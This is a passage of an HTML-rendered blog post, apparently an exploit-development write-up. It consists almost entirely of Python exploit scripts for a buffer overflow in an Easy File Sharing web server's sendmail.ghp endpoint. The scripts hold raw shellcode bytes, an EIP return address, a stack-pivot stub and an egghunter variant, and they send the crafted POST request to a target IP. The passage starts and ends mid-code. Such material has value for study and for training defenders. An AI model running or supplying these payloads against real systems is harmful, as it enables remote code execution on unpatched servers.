&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x15\x7c\xa8\xa1\x24\x4f\xbd\xa0\x61\xb2\x4c\xf0\x3a\xb8\xe3&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xe4\x4f\xf4\x3f\x8f\x1c\x18\x38\x6c\xd4\x1b\x69\x23\x6e\x42&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xa9\xc2\xa3\xfe\xe0\xdc\xa0\x3b\xba\x57\x12\xb7\x3d\xb1\x6a&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x38\x91\xfc\x42\xcb\xeb\x39\x64\x34\x9e\x33\x96\xc9\x99\x80&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xe4\x15\x2f\x12\x4e\xdd\x97\xfe\x6e\x32\x41\x75\x7c\xff\x05&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xd1\x61\xfe\xca\x6a\x9d\x8b\xec\xbc\x17\xcf\xca\x18\x73\x8b&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x73\x39\xd9\x7a\x8b\x59\x82\x23\x29\x12\x2f\x37\x40\x79\x38&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xf4\x69\x81\xb8\x92\xfa\xf2\x8a\x3d\x51\x9c\xa6\xb6\x7f\x5b&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xc8\xec\x38\xf3\x37\x0f\x39\xda\xf3\x5b\x69\x74\xd5\xe3\xe2&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x84\xda\x31\xa4\xd4\x74\xea\x05\x84\x34\x5a\xee\xce\xba\x85&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x0e\xf1\x10\xae\xa5\x08\xf3\x11\x91\x2a\x02\xfa\xe0\x4a\x05&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x47\x6d\xac\x6f\xa7\x38\x67\x18\x5e\x61\xf3\xb9\x9f\xbf\x7e&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xf9\x14\x4c\x7f\xb4\xdc\x39\x93\x21\x2d\x74\xc9\xe4\x32\xa2&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x65\x6a\xa0\x29\x75\xe5\xd9\xe5\x22\xa2\x2c\xfc\xa6\x5e\x16&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x56\xd4\xa2\xce\x91\x5c\x79\x33\x1f\x5d\x0c\x0f\x3b\x4d\xc8&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x90\x07\x39\x84\xc6\xd1\x97\x62\xb1\x93\x41\x3d\x6e\x7a\x05&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xb8\x5c\xbd\x53\xc5\x88\x4b\xbb\x74\x65\x0a\xc4\xb9\xe1\x9a&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xbd\xa7\x91\x65\x14\x6c\xa1\x2f\x34\xc5\x2a\xf6\xad\x57\x37&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x09\x18\x9b\x4e\x8a\xa8\x64\xb5\x92\xd9\x61\xf1\x14\x32\x18&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x6a\xf1\x34\x8f\x8b\xd0\x90&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;no&quot;&gt;Staging&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x54\x58&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;#PUSH ESP #POP EAX&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x83\xE8\x7F&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;#SUB EAX, 7C&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x83\xE8\x7F&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;#SUB EAX, 7C&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x83\xE8\x7F&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;#SUB EAX, 7C&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x83\xE8\x13&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;#SUB EAX, 7C&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x50\x5C&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;#PUSH EAX #POP ESP&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xFF\xE0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;#JMP EAX&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;no&quot;&gt;Stage1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Staging&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x90&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;34&lt;/span&gt;
&lt;span class=&quot;no&quot;&gt;Stage2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Buffer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Shell&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xcc&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;360&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Shell&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;no&quot;&gt;Padding&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x90&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;crash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Stage2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;EIP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Padding&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Stage1&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;POST /sendmail.ghp HTTP/1.1 &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; 
&lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Email=&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;crash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&amp;amp;getPassword=Get+Password&quot;&lt;/span&gt;

&lt;span class=&quot;no&quot;&gt;EFS&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;SOCK_STREAM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;no&quot;&gt;EFS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;80&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;no&quot;&gt;EFS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;no&quot;&gt;EFS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;For the Egg Hunting exploit, my exploit looks as follows:&lt;/p&gt;

&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/python&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
	&lt;span class=&quot;nb&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Usage: python EFS.py [IP]&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
	&lt;span class=&quot;nb&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;i.e python  EFS.py 192.168.56.101&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
	&lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;


&lt;span class=&quot;c1&quot;&gt;#Bad Chars= \x25\x26\x27\x2b\x00&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;#push esp, ret 0x61c5203b&lt;/span&gt;

&lt;span class=&quot;no&quot;&gt;EIP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x3b\x20\xc5\x61&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;

&lt;span class=&quot;no&quot;&gt;Egghunter&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;
&lt;span class=&quot;no&quot;&gt;Egghunter&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;no&quot;&gt;Egghunter&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x05\x5a\x74\xef\xb8\x72\x30\x30\x74\x89\xd7\xaf\x75&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;no&quot;&gt;Egghunter&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xea\xaf\x75\xe7\xff\xe7&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;

&lt;span class=&quot;no&quot;&gt;Stage1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Egghunter&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xcc&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;52&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Egghunter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;

&lt;span class=&quot;no&quot;&gt;Stage2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;r00tr00t&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;#&quot;\xcc&quot;*4064&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xba\x20\xb3\xd2\x36\xdb\xd8\xd9\x74\x24\xf4\x5e\x33\xc9\xb1&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x52\x31\x56\x12\x03\x56\x12\x83\xce\x4f\x30\xc3\xf2\x58\x37&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x2c\x0a\x99\x58\xa4\xef\xa8\x58\xd2\x64\x9a\x68\x90\x28\x17&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x02\xf4\xd8\xac\x66\xd1\xef\x05\xcc\x07\xde\x96\x7d\x7b\x41&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x15\x7c\xa8\xa1\x24\x4f\xbd\xa0\x61\xb2\x4c\xf0\x3a\xb8\xe3&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xe4\x4f\xf4\x3f\x8f\x1c\x18\x38\x6c\xd4\x1b\x69\x23\x6e\x42&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xa9\xc2\xa3\xfe\xe0\xdc\xa0\x3b\xba\x57\x12\xb7\x3d\xb1\x6a&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x38\x91\xfc\x42\xcb\xeb\x39\x64\x34\x9e\x33\x96\xc9\x99\x80&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xe4\x15\x2f\x12\x4e\xdd\x97\xfe\x6e\x32\x41\x75\x7c\xff\x05&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xd1\x61\xfe\xca\x6a\x9d\x8b\xec\xbc\x17\xcf\xca\x18\x73\x8b&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x73\x39\xd9\x7a\x8b\x59\x82\x23\x29\x12\x2f\x37\x40\x79\x38&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xf4\x69\x81\xb8\x92\xfa\xf2\x8a\x3d\x51\x9c\xa6\xb6\x7f\x5b&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xc8\xec\x38\xf3\x37\x0f\x39\xda\xf3\x5b\x69\x74\xd5\xe3\xe2&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x84\xda\x31\xa4\xd4\x74\xea\x05\x84\x34\x5a\xee\xce\xba\x85&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x0e\xf1\x10\xae\xa5\x08\xf3\x11\x91\x2a\x02\xfa\xe0\x4a\x05&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x47\x6d\xac\x6f\xa7\x38\x67\x18\x5e\x61\xf3\xb9\x9f\xbf\x7e&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xf9\x14\x4c\x7f\xb4\xdc\x39\x93\x21\x2d\x74\xc9\xe4\x32\xa2&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x65\x6a\xa0\x29\x75\xe5\xd9\xe5\x22\xa2\x2c\xfc\xa6\x5e\x16&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x56\xd4\xa2\xce\x91\x5c\x79\x33\x1f\x5d\x0c\x0f\x3b\x4d\xc8&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x90\x07\x39\x84\xc6\xd1\x97\x62\xb1\x93\x41\x3d\x6e\x7a\x05&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xb8\x5c\xbd\x53\xc5\x88\x4b\xbb\x74\x65\x0a\xc4\xb9\xe1\x9a&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xbd\xa7\x91\x65\x14\x6c\xa1\x2f\x34\xc5\x2a\xf6\xad\x57\x37&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x09\x18\x9b\x4e\x8a\xa8\x64\xb5\x92\xd9\x61\xf1\x14\x32\x18&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x6a\xf1\x34\x8f\x8b\xd0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;crash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Stage2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x90&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4072&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Stage2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;EIP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x90&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Stage1&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;POST /sendmail.ghp HTTP/1.1 &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; 
